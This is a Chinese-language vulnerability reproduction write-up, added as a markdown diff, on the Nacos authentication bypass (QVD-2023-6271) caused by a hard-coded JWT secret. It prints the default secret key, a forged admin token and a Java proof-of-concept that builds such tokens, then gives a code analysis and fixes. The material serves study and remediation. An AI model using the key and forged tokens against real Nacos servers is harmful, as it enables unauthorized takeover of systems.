@@ -1,0 +1,141 @@
+## 0x00 简介
+
+Nacos是一个易于使用的平台，专为动态服务发现和配置以及服务管理而设计。可以帮助您轻松构建云原生应用程序和微服务平台。
+
+## 0x01 漏洞概述
+
+目前Nacos 身份认证绕过漏洞(QVD-2023-6271)，也叫做NVDB-CNVDB-2023674205，暂无CVE编号，开源服务管理平台Nacos在默认配置下未对token.secret.key进行修改，导致远程攻击者可以绕过密钥认证进入后台，造成系统受控等后果。
+
+## 0x02 影响版本
+
+0.1.0 <= Nacos <= 2.2.0
+
+## 0x03 环境搭建
+
+在github下载有漏洞的版本  
+<https://github.com/alibaba/nacos/releases>
+
+![](./img/6545258463242123149.png)
+
+![](./img/4825220559326372498.png)
+
+而且要在配置文件中开启权限认证
+
+![](./img/348341422132515728.png)
+
+## 0x04 漏洞复现
+
+在0.1.0 <= Nacos <=
+2.2.0中，token.secret.key值是固定死的，位置在conf下的application.properties中：
+
+![](./img/202099133333065407.png)
+
+`SecretKey012345678901234567890123456789012345678901234567890123456789`  
+利用该key构造JWT，可以直接进入后台。  
+在：<https://jwt.io/>
+
+    
+    
+    payload：
+    
+    {
+      "sub": "nacos",
+      "exp": 1679318378
+    }
+    //1679318378是unix的时间戳 需要比系统晚 我的时间戳是3.20
+
+![](./img/6071934331656300336.png)
+
+`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTMxODM3OH0.RIYVwrgMhqTy_XmG6Ww2K9I40qAbarbfd4IQ3CD9HlM`  
+测试后端判断登录的是哪个参数
+
+![](./img/4449049076696373248.png)
+
+![](./img/6566923045280459372.png)
+
+可以看到 不论是在报文中添加的accessToken还是get参数的accessToken均是后台判断的依据
+
+![](./img/8089088256354534352.png)
+
+不知道为什么昨天下午没有弄出来。  
+为此KIbo师傅还来远控帮助浮现  
+顺便白嫖了师傅构造JWT的脚本
+
+    
+    
+    import io.jsonwebtoken.Claims;
+    import io.jsonwebtoken.Jwts;
+    import io.jsonwebtoken.io.Decoders;
+    import io.jsonwebtoken.security.Keys;
+    
+    import java.nio.charset.StandardCharsets;
+    import java.util.Date;
+    
+    public class key {
+        public static void main(String[] args) {
+            System.out.println(createToken("nacos"));
+        }
+    
+        public static String createToken(String userName) {
+            String key = "SecretKey012345678901234567890123456789012345678901234567890123456789";
+            long now = System.currentTimeMillis();
+            Date validity = new Date(now + 18000*1000L);
+    
+            Claims claims = Jwts.claims().setSubject(userName);
+            return Jwts.builder().setClaims(claims).setExpiration(validity)
+                .signWith(Keys.hmacShaKeyFor(Decoders.BASE64.decode(key))).compact();
+        }
+    }
+    
+
+## 0x05漏洞分析
+
+漏洞主要是因为key的值被写死在application.properties中，然后通过伪造JWT可以进行未授权操作，有点像shiro的 硬编码操作  
+在<=2.2.0的版本用户进行登录成功操作的时候会调用resolveTokenFromUser方法，就会调用 createToken方法
+
+![](./img/7207185309808150295.png)
+
+使用createToken方法创建token  
+com.alibaba.nacos.plugin.auth.impl.JwtTokenManager#createToken(java.lang.String)
+
+![](./img/5385784902432018443.png)
+
+这里面调用了getSecretKeyBytes方法把key从string转换到byte 跟进一下
+
+![](./img/3880700149432669856.png)
+
+这里面对secretKey进行base64加密  
+key则是在application.properties中被写死。看到这 就能理解之前KIbo师傅写的生成JWT的poc了  
+所以只要用这个固定的key生成的JWT就可以达到绕过登录的目的
+
+## 0x06 修复方式
+
+1.自行修改key  
+2.更新到最新版本，在最新版本中  
+com.alibaba.nacos.plugin.auth.impl.JwtTokenManager#createToken(java.lang.String)
+
+    
+    
+    public String createToken(String userName) {
+    
+        Date validity = new Date(
+                System.currentTimeMillis() + TimeUnit.SECONDS.toMillis(this.getTokenValidityInSeconds()));
+    
+        Claims claims = Jwts.claims().setSubject(userName);
+        return Jwts.builder().setClaims(claims).setExpiration(validity).signWith(secretKey, SignatureAlgorithm.HS256)
+                .compact();
+    }
+    
+    // secretKey
+    this.secretKey = Keys.hmacShaKeyFor(Decoders.BASE64.decode(encodedSecretKey));
+    
+    // encodedSecretKey
+    String encodedSecretKey = EnvUtil.getProperty(AuthConstants.TOKEN_SECRET_KEY, AuthConstants.DEFAULT_TOKEN_SECRET_KEY);
+    
+
+这里的key可以正常获取
+
+## 0x07 参考
+
+<https://zhuanlan.zhihu.com/p/602021283>
+
